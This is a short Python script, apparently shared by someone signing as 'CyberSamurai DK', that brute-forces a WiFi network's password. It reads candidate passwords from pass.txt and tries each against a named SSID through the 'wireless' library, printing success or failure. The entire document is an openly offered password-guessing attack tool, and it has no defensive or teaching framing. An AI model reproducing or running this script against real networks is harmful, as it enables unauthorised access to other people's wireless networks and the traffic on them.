#!/usr/bin/env python3

# A WiFi BruteForce script
# You will need a Pass.txt and SSID WiFi
# CyberSamurai DK

from wireless import Wireless

wire = Wireless()
with open('pass.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='NAME OF WIFI', password=line.strip()) == True:
            print('[+] (^‿^) Connection ' + line.strip() + ' - Success!')
        else:
            print('[-] (-_-) Connection ' + line.strip() + ' - FAILS!')